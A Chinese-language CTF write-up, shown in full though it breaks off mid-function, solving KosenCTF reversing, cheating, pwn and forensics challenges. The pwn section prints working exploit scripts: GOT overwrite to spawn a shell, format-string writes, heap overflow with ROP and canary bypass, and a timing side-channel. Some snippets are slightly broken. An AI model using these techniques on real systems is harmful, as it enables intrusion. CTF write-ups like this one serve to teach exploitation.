[題目來源](https://bitbucket.org/kosenctf/challenges/src/master/)

## Re

### flag generator

可以先寫一個 shared library，並透過 hook 的方式 ignore `sleep()`:

```shell
gcc -fPIC -c test.c
gcc -shared -o libtest.so test.o
```

不過後來發現用不到，逆一下會知道他是以某個特定的時間做 PRNG，得到的結果 flag 做 xor，因此直接 xor 回來就好:

```python
#!/usr/bin/python3
        
from pwn import *
        
key = 0x25DC167E
vals = [0x608F5935, 0x57506491, 0x27365557, 0x54E3DEA1, 0x755A4ED5, 0x17F42EB7, 0x4A4F9059, 0x1A08E827, 0x0D9D391F, 0x59E533AA, 0x25DC167E, 0x17F42EB7, 0x4A4F9059, 0x1A08E827, 0xD9D391F, 0x59E533AA]
v9 = b""
        
for val in vals:
    v9 += (val).to_bytes(4, byteorder='big')
        
flag = b"" 
for i in range(0, len(v9), 4): 
    flag += p32(int(v9[i:i+4].hex(), 16) ^ key)                                                                                                                              
    key = (0x41C64E6D * key + 0x3039) & 0x7FFFFFFF
        
print(flag)
```

`KOSENCTF{IS_THIS_REALLY_A_REVERSING?}`

### flag checker

```python
#!/usr/bin/python3                                                                                                                                         
from pwn import *
 
# len == 0x24 == 36 == 4*9
target = b'\x9f\xc9\xd7\xc2\nFDY\x84\xc5\xce\xc1?O_N\xbe\xd4\xde\xdd9KJL\xa6\xcf\xd1\xd1)UJN\xa3\xc3\xc3\xdd'
target_list = [u32(target[i:i+4]) for i in range(0, len(target), 4)]
 
key = 0xDEC0C0DE
flag_list = []
 
def rol(v, l):
    return ((v << l) & 0xffffffff) | ((v >> (32-l)) & 0xffffffff)
 
def ror(v, l):
    return ((v >> l) & 0xffffffff) | ((v << (32-l)) & 0xffffffff)
 
val = target_list[-1] ^ key
key = rol(key, 8)
flag_list.insert(0, val)
for i in range(len(target_list)-2, -1, -1):
    val = target_list[i] ^ key ^ target_list[i+1]
    key = rol(key, 8)
    flag_list.insert(0, val)
 
flag = b""
for part_flag in flag_list:
    flag += p32(part_flag)

print(flag)
```

簡單的 flag check，不過寫 script 的時候腦袋打結了，最後得到 flag `KOSENCTF{TOO_EASY_TO_DECODE_THIS}`。

### Rolling triangle

程式流程很簡單，而解法是用 `np.linalg.solve()` 來解聯立方程式，原本要用 z3 的，不過對於 z3， real value 使用起來比較麻煩，所以後來沒有繼續試了，exploit 如下:

```python
#!/usr/bin/python3

import struct
import math
import numpy as np

check_list = [
	'40A7B20000000000',
	'C04B213AE685DB77',
	'4050B815CA6CA03C',
	'4057B104AB606B7B',
	'40503FD249E44FA0',
	'405E22970F7B9E06',
	'4046DD29888F861A',
	'400ACCD74927913F',
	'3FFA1DC725C3DEE8',
	'4060C305BC01A36E',
	'40475E209AAA3AD2',
	'C03DF36F7E3D1CC1',
	'C05033D0D0678C00',
	'40525CA4A8C154CA',
	'40513E5436B8F9B1',
	'C05A0A2B94D94079',
	'C05A4732B55EF1FE',
	'40455E0F3CB3E575',
	'404E58A2877EE4E2',
	'4012688509BF9C63',
	'C06152BA5E353F7D',
	'C06085DE939EADD6',
	'C04BC474A771C971',
	'C04FC435BD512EC7',
	'4032C5A07B352A84',
	'C069BD97635E742A',
	'C05A3FDB22D0E560',
	'404DE1BCFD4BF099',
	'C0564EC447C30D30',
	'C0392786C226809D',
	'C05762C1FC8F3238',
	'403A4F1DE69AD42C',
	'4046F570F7B9E061',
	'404D81072085B185',
	'C042AFFC115DF655',
	'C03A4991BC558644',
	'4040D99BE4CD7492'
]

check_list_d = []
for i in range(len(check_list)):
    val = struct.unpack(">d", bytes.fromhex(check_list[i]))
    check_list_d.append(val[0])

params = []
for i in range(37):
    param = []
    for j in range(37):
        x = 6.283185307179586 * i * j / 37.0
        param.append(math.cos(x) - math.sin(x))
    params.append(param)

flag = np.linalg.solve(np.array(params), np.array(check_list_d))
for c in flag:
    print(chr(int(c+0.001)), end='')

# KOSENCTF{DO_YOU_KNOW_OF_METAL_MOMOKO}
```

## Cheat

### anti cheat

為一個 block & balance 的遊戲，只有一個被混淆過的 js 檔案，先丟到 [js beautifier](https://beautifier.io/) 美化一下，而美化過的 js 檔案一共有 5 萬行，先挑的字串來看 (`PRESS <SPACE> TO START` and `PRESS <SPACE> TO RESTART`)，而在最後 `PRESS <SPACE> TO RESTART` 的地方有一個判斷式 `if ((_e3._r3 >= 1000)) {...} else {... "PRESS <SPACE> TO RESTART" }`，看起來就像是在比對分數是否 >= 1000，如果有的話就成功，而失敗就會出現 `PRESS <SPACE> TO RESTART`，於是將判斷式從 `>= 1000` 改成 `< 1000`，就輸出 flag `KOSENCTF{bASIc_buT_STrOng_AnTI_chEAT}` 了。

### Spaceship

apk dump 後的目錄結構:

- assets: 資源目錄，包含了圖片和字型
- build、dist: 為重新編譯生成的，新的 apk 會在 dist 目錄
- lib: so 
- original: 儲存了原簽名和反編譯前的清單檔案
- res: 儲存 layout, strings 等 xml 檔案
- unknown: 不用管
- AndroidManifest.xml: 清單檔案
- smali、smali_classes2: apk 中的每個 dex 檔案會反編譯出一個 smali 資料夾，classes.dex 對應 smali，classes2.dex 對應smali_classes2，以此類推

而找了 smali 以及 libyoyo.so，都沒有找到什麼特別的，後來發現 `game.droid` 內部有 `others.kosenctf.com` 的字串，猜測結束時會發送分數相關的封包給 `others.kosenctf.com`，如果超過一定分數就會給 flag，不過我的環境沒辦法使用 wireshark 抓 android 的封包 (正在嘗試)，因此無法知道資料的結構，並且 libyoyo.so 所使用的 `game.droid` (IFF) 內容也不知道怎麼產生出來的。最後只需要攔截封包並更改分數，夠高分就會回傳 flag。

- `DROID `(Digital Record Object Identification)
  - The droid file extension is associated with the DROID (Digital Record Object Identification) project. The droid file stores profile data. The Digital Record Object Identification app is obsolete without support from developer, or producer.
- [JVM vs. DVM](https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/647337/)
  - DVM
    - DalviK VM
    - Java bytecode -(dex compiler)-> Dalvik bytecode (.dex) --> DVM
    - Register-based
  - JVM
    - Stack-based
- smali
  - smali/baksmali is an assembler/disassembler for the dex format used by dalvik, Android's Java VM implementation.
    The syntax is loosely based on Jasmin's/dedexer's syntax, and supports the full functionality of the dex format (annotations, debug info, line info, etc.)
  - [教學1](https://blog.csdn.net/chenrunhua/article/details/41250613)
  - [教學2](http://wossoneri.github.io/2019/09/12/[Android][Security]Decompile-smali/#toc-heading-4)
- Interchange File Format (IFF)
  - in order to facilitate transfer of data between software produced by different companies
  - The top-level structure of an IFF file consists of exactly one of the group chunks: FORM, LIST or CAT , where FORM is by far the most common one
  - libyoyo.so 運行時會在 `RunnerLoadGame()` 使用到 iff `game.droid` 並取得其資料，之後的執行流程為: ` DoTheWork() -> Run_Start()`，過程中不確定那些資料到底做了什麼

### lights out

為 .NET 寫的遊戲，目標是讓全部的格子都是亮的，不過因為有被 obfuscate 過，因此用 dnSpy 修都會編譯不過，這邊使用 IDA 來改，把一開始初始化的地方改成全部都是亮的，之後程式在做判斷時會檢查是不是都是亮的，如果是的話就會噴 flag `KOSENCTF{st4tic4lly_d3obfusc4t3_OR_dyn4mic4lly_ch34t}`。

其他解法如直接用 cheat engine 動態調整格子的顏色，或是直接靜態分析到產生 flag 的地方，直接用 python script 解出 flag。

## Pwn

### double check

```
// file
auth: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e687e6be8ff2e812431014cd77c446b65f32b3d8, not stripped

// checksec
[*] '/tmp/tmp/challenges/double_check/build/double_check/auth'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

- stack overflow `%s`
- 用 `printf_plt` + `alarm_got` leak libc
- 蓋 `strncmp_got` 成 `system()`、蓋 `password` 成  `/bin/sh`、利用 `strncmp(password)` get shell

exploit:

```python
#!/usr/bin/python3

from pwn import *
 
context.arch = 'i386'
 
r = process('./auth')
 
printf_plt = 0x80484b0
alarm_got = 0x0804a018
_main = 0x8048789
_read = 0x080487D9
offset = 0x28+4
strncmp_got = 0x0804a03c
 
r.sendlineafter("Password: ", offset*b'\xff' + p32(printf_plt) + p32(_read) + p32(alarm_got) + p32(strncmp_got))
r.recvuntil("Invalid password.\n")
libc = u32(r.recv(4)) - 0xcd180
info(f"libc: {hex(libc)}")
_system = libc + 0x45830
payload = p32(_system).ljust(0x44, b'\xff') + b"/bin/sh\x00"
r.sendline(payload)
 
r.interactive()
```

## Introduction

```
// file
introduction:   ELF 32-bit LSB shared object, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=0b1f22387262614a5200653de20653fabd037978, not stripped

// checksec
[*] '/tmp/tmp/challenges/introduction/build/introduction/introduction'
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

fmt 打法，不過 Full RELRO，所以必須要 ret2lib，並且自己產生 `sh` 餵給 `system()` 執行 `system("sh")`。

```python
#!/usr/bin/python3
from pwn import *
     
context.arch = 'i386'
     
r = process('./introduction')
     
written = 0
def next_bytes(n, bits):
    global written
    written_mask = written & ((1 << bits) - 1)
     
    if written_mask < n:
        written += n - written_mask
        return n - written_mask
    else:
        written += ((1 << bits) - written_mask) + n
        return ((1 << bits) - written_mask) + n
     
## leak
r.sendlineafter("First Name: ", "%p-"*10)
leak = r.recvline()[:-1].split(b'-')
libc = int(leak[3], 16) - 0x23e000
info(f"libc: {hex(libc)}")
info(f"stack: {hex(stack)}")
     
_system = libc + 0x45830
sh_hex = u32(b"sh\x00\x00")
target = stack + 0x90
sh_target = stack + 0x128
     
info(f"target: {hex(target)}")
     
payload = b""
padding = 72
base_offset = 7
idx = 7 + (padding // 4)
     
for i in range(3):
    val = (_system >> i*8) & 0xff
    payload += f"%{next_bytes(val, 8)}c%{idx}$hhn".encode()
    idx += 1
     
or i in range(3):
    val = (sh_hex >> i*8) & 0xff
    payload += f"%{next_bytes(val, 8)}c%{idx}$hhn".encode()
    idx += 1
    
payload = payload.ljust(padding, b'\xee')
for i in range(3):
    payload += p32(target + i)
for i in range(3):
    payload += p32(sh_target + i)
    
print(payload)
r.sendlineafter("Family Name: ", payload)
r.interactive()
```

## ziplist

```
// file
ziplist: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=95e6023290054b1419cc679a4d29e39ac119f7f0, not stripped

// checksec
[*] '/tmp/tmp/challenges/ziplist/build/ziplist'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

可以列出 zip 內檔案有哪些，關於 zip 的結構可以餐靠 [zip wiki](https://en.wikipedia.org/wiki/ZIP_(file_format))。

trace 後會發現有兩個地方有漏洞:

- `zip_check_header()` 中，寫入 comment 時會發現 main function 中給 comment 的 array len 只有 72，如果 comment 長度超過 72 就會有 overflow 發生，不過因為有 canary 的關係，沒辦法直接使用:

```c
...
	  fseek(a1_FILE_zip, -offset, 2);
      fread(a3_zipcomment, 1uLL, offset, a1_FILE_zip);
      a3_zipcomment[offset] = 0;
...
```

- `zip_get_entries()` 中，對於 filename 的長度 hardcode 0x40，因此當 filename > 0x40，就會有 heap overflow 的情況發生:

```c
 *a3_output = malloc(8LL * *(a2_EOCD + 10));   // 10: Total number of central directory records
  for ( i = 0; *(a2_EOCD + 10) > i; ++i )       // create space
  {
    v3_chunk_list = (*a3_output + 8 * i);       // [chunk1_ptr, chunk2_ptr, ..., chunkn_ptr]
    *v3_chunk_list = malloc(0x2EuLL);
    v4_chunk_address = *(*a3_output + i);
    *(v4_chunk_address + 0x2E) = malloc(0x40uLL);// <---------here
  }
  for ( j = 0; *(a2_EOCD + 10) > j; ++j )
  {
    fread(*(*a3_output + j), 0x2EuLL, 1uLL, a1_FILE_zip);// read a Central directory file header
    if ( **(*a3_output + j) != '\x02\x01KP' )   // Central directory file header
      return 1LL;
    fread(*(*(*a3_output + j) + 0x2ELL), 1uLL, *(*(*a3_output + j) + 28LL), a1_FILE_zip);// 28: File name length (n)
                                                // 46 ~ 46+n: filename
    fseek(a1_FILE_zip, *(*(*a3_output + j) + 0x1ELL) + *(*(*a3_output + j) + 0x20LL), 1);// 30: Extra field length (m)
                                                // 32: File comment length (k)
  }
```

而如果能透過 overflow 蓋到下一個 chunk 的 filename pointer，就可以任意寫入，不過這題麻煩的是沒辦法 leak libc + canary，因此要想辦法透過寫 GOT 以及堆 ROP 來 exploit:

```python
#!/usr/bin/python3

from pwn import *

WORD = 2
DWORD = 4

context.arch = 'amd64'

off_cendir = 0 # Offset of start of central directory
num_cendir = 0 # Total number of central directory records
___stack_chk_fail_got = 0x602030
ret = 0x400639
readfile = 0x400c53
bss = 0x602900

"""
len: 0x2e
Central directory file header
"""
def gen_chunk(fn_len):
    cendir_chunk = b""
    cendir_chunk += b'\x02\x01KP'[::-1] # magic
    cendir_chunk = cendir_chunk.ljust(0x1c, b'\x00') # dummy
    cendir_chunk += p16(fn_len) # File name length --> heap overflow
    cendir_chunk += p16(0) # Extra field length
    cendir_chunk += p16(0) # File comment length
    # ---- 0x20 ----
    cendir_chunk = cendir_chunk.ljust(0x2e, b'\x00') # dummy

    return cendir_chunk

def write_to(dst, payload):
    global num_cendir
    num_cendir += 2
    
    chunk1 = gen_chunk(0x50+0x2e+0x8)
    chunk2 = gen_chunk(len(payload)) # <= 0x48
    fn1 = b'A'*0x48 + p64(0x41) + b'B'*0x2e + p64(dst)
    fn2 = payload

    return chunk1 + fn1 + chunk2 + fn2

pop_rdi_ret = 0x401043
pop_rsi_r15_ret = 0x401041
leave_ret = 0x4009eb
ret = 0x400639
readfile = 0x400c5b
flag_addr = bss + 7*0x8
new_rbp = bss+0x100
rop = p64(new_rbp) + p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_r15_ret) + p64(0x100) + p64(0) + p64(readfile) + b'flag'.ljust(0x8, b'\x00')

payload = write_to(___stack_chk_fail_got, p64(ret))
for i in range(0, len(rop), 0x48):
    if i + 0x48 >= len(rop):
        payload += write_to(bss + i, rop[i:len(rop)])
    else:
        payload += write_to(bss + i, rop[i:i+0x48])

comment = b'\xff'*0x60 + p64(bss) + p64(leave_ret) + b'\xff'*8
EOCD = b'\x06\x05KP'[::-1].ljust(10, b'\xff') + p16(num_cendir) + b'\x00'*DWORD + p32(off_cendir) + p16(len(comment)) + comment
payload += EOCD

open('meow.zip', 'wb').write(payload)
r = process(["./ziplist", "./meow.zip"])
r.interactive()
```

先把 canary 的 check function `___stack_chk_fail` 寫成 `ret`，這樣 canary 就不會壞掉，之後 stack pivoting (`leave ret`) 到 bss，執行透過 heap overflow 任意寫的 ROP 來執行 `readfile("flag", 0x100)`，得到 flag `KOSENCTF{H3ap0v3rfl0w+G0T0v3rwrit3+KillSSP+Buff3r0v3rfl0w}`。



- SSP (Stack Smashing Protector)，也就是:

  - ```assembly
    mov     rbx, [rbp+v18_canary]
    xor     rbx, fs:28h
    jz      short loc_400FD4
    call    ___stack_chk_fail
    ```

### Sandbox

```
// file
sandbox: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=c154bf9b855b1e9000196f2ce54fdbb474fe3984, not stripped

// checksec
[*] '/tmp/tmp/challenges/sandbox/build/sandbox'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

seccomp:

```
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0e 0xc000003e  if (A != ARCH_X86_64) goto 0016
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x0b 0xffffffff  if (A != 0xffffffff) goto 0016
 0005: 0x15 0x09 0x00 0x00000000  if (A == read) goto 0015
 0006: 0x15 0x08 0x00 0x00000002  if (A == open) goto 0015
 0007: 0x15 0x07 0x00 0x00000003  if (A == close) goto 0015
 0008: 0x15 0x06 0x00 0x00000009  if (A == mmap) goto 0015
 0009: 0x15 0x05 0x00 0x0000000a  if (A == mprotect) goto 0015
 0010: 0x15 0x04 0x00 0x0000000b  if (A == munmap) goto 0015
 0011: 0x15 0x03 0x00 0x0000000c  if (A == brk) goto 0015
 0012: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0015
 0013: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0015
 0014: 0x15 0x00 0x01 0x00000101  if (A != openat) goto 0016
 0015: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0016: 0x06 0x00 0x00 0x00000000  return KILL
```

由於沒有 output，所以要找其他方式來 check input 是否正確，而我的方式為，在輸入正確的 flag char 時，會進行一個很長的 for loop comparation，因此結束的時間會比錯誤 flag char 還要慢許多，藉此來判斷當前 char 是否正確，以下為 exploit:

```python
#!/usr/bin/python3

from pwn import *
import datetime

"""
 *rip: 0x3231
 arg1: 0x3 == 0x31 >> 4
 arg2: 0x100 (0x01 << 8) | 0x32 == 0x132
"""

def push_rax():
    return p16(0x0000)

def push_rbx():
    return p16(0x0010)

def pop_rax():
    return p16(0x0020)

def pop_rbx():
    return p16(0x0030)

def mov_rax_val(val):
    return p16(0x0040 | ((val & 0xf00) >> 8) | ((val & 0xff) << 8))

def mov_rbx_val(val):
    return p16(0x0050 | ((val & 0xf00) >> 8) | ((val & 0xff) << 8))

def add_rax_val(val):
    return p16(0x0060 | ((val & 0xf00) >> 8) | ((val & 0xff) << 8))

def sub_rax_val(val):
    return p16(0x0070 | ((val & 0xf00) >> 8) | ((val & 0xff) << 8))

def mov_rax_rsp():
    return p16(0x0080)

def mov_rax_rsp_offval(val):
    return p16(0x0090 | ((val & 0xf00) >> 8) | ((val & 0xff) << 8))

def and_rax_rbx():
    return p16(0x00a0)

def jnz_offval(val):
    return p16(0x00b0 | ((val & 0xf00) >> 8) | ((val & 0xff) << 8))

def jz_offval(val):
    return p16(0x00c0 | ((val & 0xf00) >> 8) | ((val & 0xff) << 8))

def jmp_offval(val):
    return p16(0x00d0 | ((val & 0xf00) >> 8) | ((val & 0xff) << 8))

def shl_rax_val(val):
    return p16(0x00e0 | ((val & 0xf00) >> 8) | ((val & 0xff) << 8))

def syscall(val):
    return p16(0x00f0 | ((val & 0xf00) >> 8) | ((val & 0xff) << 8))

"""
(dword offset, total 0x14(5 register))
| 0  |  1  |  2  |  3  |  4  |
 rax   rbx   rip   rsp  logop
"""

# rax = open(stack + rax, 0)
def open_syscall(fn):
    sc = b""
    fn = fn.encode()[::-1].ljust(((len(fn) // 4) + 1) * 4, b'\x00') # alignment 4
    for i in range(0, len(fn), 4):
        fn_part = fn[i:i+4]
        sc += mov_rax_rsp()
        sc += mov_rax_val(fn_part[0])
        for j in range(1, 4):
            sc += shl_rax_val(8)
            sc += add_rax_val(fn_part[j])
        sc += push_rax()
    sc += syscall(2)
    return sc

# read(rax, stack + rsp, rbx)
def read_syscall(fd, size):
    sc = b""
    sc += mov_rax_val(fd)
    sc += mov_rbx_val(size)
    sc += syscall(1)
    return sc

# close(rax)
def close_syscall():
    return syscall(3)

def exit_syscall():
    return syscall(0)

flag = b""

while len(flag) <= 20:
    for curr_byte in range(0x100):
        r = process('./sandbox')
        sc = b""
        sc += open_syscall("flag")
        sc += mov_rax_val(0)

        for _ in range(0x10):
            sc += push_rax()

        for _ in range(len(flag)):
            sc += read_syscall(0x3, 0x1)
        
        sc += read_syscall(0x3, 0x1)
        sc += mov_rax_rsp_offval(0)
        sc += push_rax()
        sc += pop_rbx()
        sc += pop_rbx()
        sc += push_rax()
        sc += mov_rax_val(curr_byte)
        sc += and_rax_rbx()
        sc += jnz_offval(len(sc) + 6) # correct
        
        # non_correct:
        sc += close_syscall()
        sc += exit_syscall()
        
        # correct:
        sc += mov_rax_val(0)
        sc += add_rax_val(0x01)
        sc += shl_rax_val(8)
        sc += add_rax_val(0xff)
        sc += shl_rax_val(8)
        sc += add_rax_val(0xff)
        sc += shl_rax_val(8)
        sc += add_rax_val(0xff)
        sc += push_rax()
        sc += pop_rbx()
        sc += pop_rbx()
        sc += push_rax()
        sc += mov_rax_val(0)

        # compare
        compare = len(sc)
        sc += and_rax_rbx()
        sc += jnz_offval(len(sc) + 6) # equal
        sc += add_rax_val(1)
        sc += jmp_offval(compare)

        # equal:
        sc += close_syscall()
        sc += exit_syscall()
        
        # input("send inst...")
        a = datetime.datetime.now()
        r.send(sc)
        r.poll(True)
        b = datetime.datetime.now()
        c = b - a
        r.close()
        if c.total_seconds() > 0.1:
            break

    flag += bytes([curr_byte])
    print(flag)
```

## Forensics

### attack log

眾多相同大小的 HTML object 中，會有大小不一樣的，dump 下來會發現他的頁面顯示 `The flag is KOSENCTF{<the password for the basic auth>}`，轉回看比較詳細的 packet response，會發現 Authorization 是通過的，將 base64 encode 過的 token decode 後就是 flag 了 `bRut3F0rc3W0rk3D`。

### Conversation

給了一個 image file  `android_8.1_x86_oreo.img: Linux rev 1.0 ext4 filesystem data, UUID=57f8f4bc-abf4-655f-bf67-946fc0f9f25b (needs journal recovery) (extents) (large files)`，並且根據題目敘述應該是一個 memory dump，不過因為 unmount 沒有處理好，造成 `needs journal recovery`，因此沒辦法 mount 起來看。

這邊選擇了 [FTK Imager](https://marketing.accessdata.com/l/46432/2020-09-24/8l45td) 來瀏覽 image，會在 `app` 底下發現 `kosenctf.kosencrypto` 這個 app，extract 出 apk 後用 `apktool d base.apk` extract 出 smali，會發現 `MainActivity` 有一個與 `pkcs5padding` 加密相關的 class，key 為 `p4ssw0rd-t0-hid3`、iv 為 `str0ng-s3cr3t-1v` 不過目前似乎沒什麼用。

用 dex2jar 在解 apk 時會噴 `com.googlecode.d2j.DexException: not support version`，可能是版本的問題，這邊也可以直接使用 [online decompiler](http://www.javadecompilers.com/result) 得到 java file。

而從題目的觀點來找其他資訊，題目要求看 conversation 應該是從找訊息 / 通話紀錄等等下手，所以下一步著手在 survey android directory structure，像是 `/data/com.android.providers.*` 是 android 預設用來儲存相關資料的目錄，內部會放 cache 或是 db。將目錄下的 db extract 後可以用 [DB Browser](https://sqlitebrowser.org/dl/) 之類的工具瀏覽，其中在 `contact2.db` 會發現 table ` data` 存的資料會以 base64 來 encode 並儲存，可以知道 conversation 訊息應該也是會儲存成這樣的形式。

統整出部分的目錄結構:

| directory                                                    | content                                                      |
| :----------------------------------------------------------- | :----------------------------------------------------------- |
| /system                                                      | operating system-specific data, including the Android UI and pre-installed applications |
| /system/packages.list                                        |                                                              |
| /data                                                        | user-specific data                                           |
| /data/com.android.providers.contacts/databases/              | 通話紀錄                                                     |
| /data/com.android.providers.telephony/databases/mmssms.db    | SMS / MMS                                                    |
| /data/com.android.browser/databases/broser2.db or browser.db | browser 的瀏覽紀錄                                           |
| /data/com.[google](http://d.hatena.ne.jp/keyword/google).[android](http://d.hatena.ne.jp/keyword/android).apps.messaging/databases/bugle_db | newer android 存放 SMS / MMS 的地方                          |

之後會在 `/data/com.apps.messaging/databases/bugle_db` 看到 `conversation` table，裡面除了 plaintext 的傳送訊息外，還有一個被 base64 encode 過的 text `GVuIBG/lSSUNW6jZqR20hw==`，而在一開始的時候有找到一個加密的 method，用裡面的 `key` 以及 `iv` decrypt 後得到 `b'I got it.\x07\x07\x07\x07\x07\x07\x07'`，而在 `parts` table 找到另一個 base64 encode text `pwgh/nXO1tMf6TXUd99mhNH01GcCqVDxDBy1+sDf37s4nnYRuHkS+AOoiH3DmKU3I+ZYHEsllcwlnm6FWjAb5g==`，decrypt 後得到 `b'The flag is KOSENCTF{7h3_4r7_0f_4ndr01d_f0r3n51c5}\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e\x0e'`。

```python
#!/usr/bin/python3                                                                   
 
from Crypto.Cipher import AES 
from base64 import b64decode
 
key = b'p4ssw0rd-t0-hid3'
iv = b'str0ng-s3cr3t-1v'
d = b'pwgh/nXO1tMf6TXUd99mhNH01GcCqVDxDBy1+sDf37s4nnYRuHkS+AOoiH3DmKU3I+ZYHEsllcwlnm6FWjAb5g=='
 
def decrypt(enc):
    enc = bytes.fromhex(enc)
    cipher = AES.new(key, AES.MODE_CBC, iv) 
    return cipher.decrypt(enc)
 
ciphertext = b64decode(d).hex()
print(decrypt(ciphertext))
```



- [Download FTK Imager](https://marketing.accessdata.com/e/46432/a-FTK-Imager-4-5-0-28x6429-exe/8lnppj/2085303786?h=Attc8rooD9H_KayYW2y4uMAKhcan4unc49Za_oTGiLs)
- [getting-started-android-forensics](https://resources.infosecinstitute.com/topic/getting-started-android-forensics/)
- [android directory structure](https://www.androidauthority.com/phone-storage-folders-explained-744100/)
- `provider.*`: Provides convenience classes to access the content providers supplied by Android

### matroska

volatility 在 profile 為 windows 10 的環境時，`imageinfo` 都會跑很久，所以直接解看解不解的出來:

- x86: Win10x86_10586, Win10x86_14393, Win10x86_15063
- x64: Win10x64_10586, Win10x64_14393, Win10x64_15063

這邊試出來的版本是 `Win10x64_15063`。



`cmdline` 中有一個 `svchost.exe` 的執行目錄很奇怪:

```
...
vlc.exe pid:   5700
...
conhost.exe pid:   3368
Command line : \??\C:\Windows\system32\conhost.exe 0x4
...
svchost.exe pid:   4940
Command line : C:\Windows\svchost.exe
...
```

正常的情況下應該會位在 `C:\Windows\system<32 or 64>`，不過這邊卻位於 `C:\Windows`，如果用 `pstree` 看:

```
... 0xffffe00e576d1580:vlc.exe                       5700   3452      0 ------ 2018-12-25 03:11:00 UTC+0000
.... 0xffffe00e574fe3c0:svchost.exe                  4940   5700      2      0 2018-12-25 03:11:10 UTC+0000
..... 0xffffe00e5618a580:conhost.exe                 3368   4940      6      0 2018-12-25 03:11:10 UTC+0000
```

會發現是 `vlc.exe` 所叫出來的，並且下面還有一個 child process 執行 `conhost.exen`，雖然 `vlc.exe` 是正常的 media player，不過也有可能是 malware 所偽裝。

先看假的 `svchost.exe` 做了什麼，用 `/home/u1f383/volatility/vol.py -f memdump.raw --profile Win10x64_15063 --pid=4940 dlldump -D dll` 將 dll dump 出來:

```
svchost.exe
ntdll.dll
SspiCli.dll
gdi32full.dll
ntmarta.dll
wow64win.dll
ole32.dll
wow64cpu.dll
KERNEL32.DLL
CoreUIComponents.dll
MSCTF.dll
msvcp_win.dll
ucrtbase.dll
win32u.dll
kernel.appcore
OLEAUT32.dll
CoreMessaging.dll
CRYPTBASE.dll
RPCRT4.dll
bcryptPrimitives.dll
USER32.dll
wintypes.dll
sechost.dll
wow64.dll
combase.dll
msvcrt.dll
IMM32.DLL
KERNELBASE.dll
ntdll.dll
TextInput...work.dll
advapi32.dll
SHCORE.dll
user32.dll
GDI32.dll
uxtheme.dll
```

一共有這些檔案 (細節已刪減)，不過搜了一下都是正常的 dll，這時候想到 `svchost.exe` 也是看似正常的檔案，但是對應到不正常的路徑，因此試著用 `dlllist` 來看各個 dll 的路徑是否正常:

```
C:\Windows\svchost.exe
C:\Windows\SYSTEM32\ntdll.dll
C:\Windows\System32\wow64.dll
C:\Windows\System32\wow64win.dll
C:\Windows\System32\wow64cpu.dll
C:\Windows\svchost.exe
C:\Windows\SYSTEM32\ntdll.dll
C:\Windows\System32\KERNEL32.DLL
C:\Windows\System32\KERNELBASE.dll
C:\Windows\System32\USER32.dll
C:\Windows\System32\win32u.dll
C:\Windows\System32\GDI32.dll
C:\Windows\System32\gdi32full.dll
C:\Windows\System32\msvcp_win.dll
C:\Windows\System32\ucrtbase.dll
C:\Windows\System32\IMM32.DLL
C:\Windows\user32.dll
C:\Windows\system32\uxtheme.dll
C:\Windows\System32\msvcrt.dll
C:\Windows\System32\combase.dll
C:\Windows\System32\RPCRT4.dll
C:\Windows\System32\SspiCli.dll
C:\Windows\System32\CRYPTBASE.dll
C:\Windows\System32\bcryptPrimitives.dll
C:\Windows\System32\sechost.dll
C:\Windows\System32\MSCTF.dll
C:\Windows\System32\OLEAUT32.dll
C:\Windows\System32\kernel.appcore.dll
C:\Windows\SYSTEM32\TextInputFramework.dll
C:\Windows\SYSTEM32\CoreUIComponents.dll
C:\Windows\System32\SHCORE.dll
C:\Windows\System32\advapi32.dll
C:\Windows\SYSTEM32\CoreMessaging.dll
C:\Windows\SYSTEM32\ntmarta.dll
C:\Windows\SYSTEM32\wintypes.dll
C:\Windows\System32\ole32.dll
```

結果很明顯，只有 `C:\Windows\user32.dll` 在 `C:\Windows` 目錄下，於是就把對應到的 dump file `module.4940.4e3003c0.880000.dll` 以及 `module.4940.4e3003c0.73b80000.dll` 拿出來看，或是可以直接用 offset 來 dump `volatility -f memdump.raw --profile Win10x64_15063 dlldump --pid=4940 --base=0x0000000000880000 -D .`。

svchost.exe:

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  HMODULE v3; // esi
  void (*__GetWindowLong)(void); // eax

  v3 = LoadLibraryA("C:\\Windows\\user32.dll");
  __GetWindowLong = GetProcAddress(v3, "__GetWindowLong");
  __GetWindowLong();
  FreeLibrary(v3);
  return MessageBoxA;
}
```

再去看 user32.dll 的 `_GetWindowLong()`:

```c
int _GetWindowLong()
{
  signed int v0; // ebx
  signed int i; // ecx
  signed int j; // ecx

  v0 = strlen(Text);
  for ( i = 0; i < v0; ++i )
    Text[i] = i ^ ~Text[i];
  MessageBoxA(0, Text, Caption, 0x40u);
  for ( j = 0; j < v0; ++j )
    Text[j] ^= ~(v0 - j);
